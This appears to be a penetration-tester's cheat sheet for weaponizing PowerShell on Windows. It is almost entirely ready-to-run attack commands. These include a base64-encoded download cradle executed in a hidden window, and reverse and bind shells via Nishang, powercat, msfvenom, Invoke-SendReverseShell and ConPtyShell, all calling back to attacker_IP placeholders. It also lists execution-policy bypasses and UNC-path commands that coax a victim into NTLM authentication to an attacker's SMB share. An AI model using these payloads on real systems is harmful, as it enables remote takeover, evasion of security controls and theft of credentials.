---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - windows
---
# Manual

> [!INFO] [Line Maximum Limit](https://devblogs.microsoft.com/scripting/increase-powershell-command-history-to-the-max-almost/)
> The maximum length of lines is total of 32768 when executing through Windows PowerShell or Windows Terminal.

## 01 - Base64 Encoded

Encode the string of commands.

```
$ string="IEX ((New-Object Net.WebClient).DownloadString('http[s]://<IP>/payload.ps1'))"

$ iconv -t UTF-16LE <<< $string | base64 -w 0

$ iconv -t UTF-16LE <<< $string | basenc -w 0 --base64

$ iconv -t UTF-16LE <<< $string | openssl enc -a -e -A

$ iconv -t UTF-16LE <<< $string | openssl enc -base64 -A
```

Then execute it in a one-liner.

```
C:\> powershell.exe -nop -NonI -Nologo -w hidden -enc <base64_encoded>
```

## 02 - Generate Payloads

### 2.1 - Reverse Shells

#### 01 - Nishang

##### 1.1 - TCP Protocol

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1')

Invoke-PowerShellTcp -Reverse -IPAddress <attacker_IP> -Port <attacker_PORT>
```

##### 1.2 - UDP Protocol

Download cradle through memory.

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1')

Invoke-PowerShellUdp -Reverse -IPAddress <attacker_IP> -Port <attacker_PORT>
```

##### 1.3 - ICMP Protocol

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1')

Invoke-PowerShellIcmp -IPAddress <attacker_IP>
```

#### 02 - `Invoke-SendReverseShell`

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Arno0x/PowerShellScripts/refs/heads/master/Invoke-SendReverseShell.ps1')
```

Direct connection.

```
PS C:\> Invoke-SendReverseShell -DestHost <attacker_IP> -DestPort <attacker_PORT>
```

Connection through system's default proxy.

```
PS C:\> Invoke-SendReverseShell -DestHost <attacker_IP> -DestPort <attacker_PORT> -UseDefaultProxy
```

Connection through manually specified proxy

```
PS C:\> Invoke-SendReverseShell -DestHost <attacker_IP> -DestPort <attacker_PORT> -ProxyName <HTTP_proxy_IP> -ProxyPort <HTTP_proxy_PORT>
```

#### 03 - `powercat`

Generate reverse shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -g
```

Generate base64 encoded reverse shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -ge
```

Persist callback shell.

```
> powercat -c <IP> -p <PORT> -e cmd.exe -rep
```

#### 04 - `msfvenom`

##### 4.1 - x86 (32-bit) Payloads

```
$ msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> -f raw -o payload.bat
```

You can load powershell scripts ahead of time.

```
$ msfvenom -p cmd/windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o payload.ps1

$ msfvenom -p windows/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o payload.ps1
```

##### 4.2 - x86-64 (64-bit) Payloads

You can load powershell scripts ahead of time.

```
$ msfvenom -p windows/x64/powershell_reverse_tcp lhost=<IP> lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o shell-x64.ps1
```

#### 05 - Fully Interactive PowerShell

^56e959

##### 5.1 - Method One

This will set the terminal size automatically without passing the `rows` and `cols` manually.

```
PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <attacker_IP> <attacker_PORT>
```

##### 5.2 - Method Two

When you encounter an problem to ensure that the `cols` and `rows` are set manually. Here you should use the values read from `stty size` command in the Parameters `-Rows` and `-Cols`

```
PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <attacker_IP> -RemotePort <attacker_PORT> -Rows <rows> -Cols <columns>
```

##### 5.3 - Method Three

Here you should use the values read from `stty size` command in the Parameters `-Rows` and `-Cols`.

```
PS C\> IEX (IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -Upgrade -Rows <rows> -Cols <columns>
```

### 2.2 - Bind Shells

#### 01 - Nishang

##### 1.1 - TCP Protocol

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1')

Invoke-PowerShellTcp -Bind -Port <PORT>
```

##### 1.2 - UDP Protocol

```
PS C:\> IEX (New-Object System.Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellUdp.ps1')

Invoke-PowerShellUdp -Bind -Port <PORT>
```

#### 02 - `powercat`

Generate bind shell.

```
> powercat -l -p <PORT> -e cmd.exe -g
```

Generate encoded bind shell.

```
> powercat -l -p <PORT> -e cmd.exe -ge
```

#### 03 - `msfvenom`

##### 3.1 - x86 (32-bit) Payloads

You can load powershell scripts ahead of time.

```
$ msfvenom -p cmd/windows/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o payload.ps1

$ msfvenom -p windows/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o payload.ps1
```

##### 3.2 - x86-64 (64-bit) Payloads

You can load powershell scripts ahead of time.

```
$ msfvenom -p windows/x64/powershell_bind_tcp lport=<PORT> LOAD_MODULES="http[s]://<IP>/script.ps1,http[s]://<IP>/script.ps1," -o payload-x86-64.ps1
```

## 03 - Execute Payload

System32 is for 32-bit powershell payloads

```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ex bypass -f payload.ps1

C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f payload.ps1
```

SysWOW64 is for 64-bit powershell payloads

```
C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -f payload.ps1

C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f payload.ps1
```

### 3.1 - Execution Policy

```
PS C:\> Set-ExecutionPolicy Bypass -Scope <CurrentUser | Process> [-File C:\path\to\payload.ps1

PS C:\> $Env:PSExecutionPolicyPreference="bypass"
```

Execute cmdlets to perform SMB authentication relay.

```
PS C:\> Get-ChildItem \\<attacker_IP>\<share_name>

PS C:\> Get-Content \\<attacker_IP>\<share_name>\payload.txt

PS C:\> Start-Process \\<attacker_IP>\<share_name>

PS C:\> Resolve-DnsName -LlmnrOnly Snare 2> $Null
```

---
## References

### Backlinks

- [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/Malware Development/Bypass Defenses/Obfuscation/Techniques/Modify File/Cross Platform/PowerShell||Malware Development: PowerShell Obfuscation Techniques]]

- [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/Malware Development/Bypass Defenses/Obfuscation/Techniques/String Manipulation/Windows/Batch|Malware Development: Batch Obfuscation Techniques]]

- [[07 - Tactics & Techniques & Procedures Phases/C - Initial Access/0x01 - Weaponization/0xC - Shell Handler/Windows/Powercat|Shell Handler: Powercat]]

### Source Repositories

- [r00t-3xp10it: CmdLine Scripts for Reverse TCP Shell Addicts](https://github.com/r00t-3xp10it/venom/wiki/CmdLine-%26-Scripts-for-reverse-TCP-shell-addicts)

- [MrPineMan: Awesome Reverse Shell](https://github.com/MrPineMan/Awesome-Reverse-Shell)

- [samratashok: Nishang](https://github.com/samratashok/nishang)

- [Arno0x: PowerShellScripts](https://github.com/Arno0x/PowerShellScripts)

- [antonioCoco: ConPtyShell](https://github.com/antonioCoco/ConPtyShell)

### Hacktricks

- [Hacktricks: Shell Windows](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/windows.html)

### Ironhackers

- [Ironhackers: Commands in Windows to Get Shell](https://ironhackers.es/en/cheatsheet/comandos-en-windows-para-obtener-shell/)

### NetSPI

- [NetSPI: 15 Ways to Bypass the PowerShell Execution Policy](https://www.netspi.com/blog/technical-blog/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)

### Osanda

- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)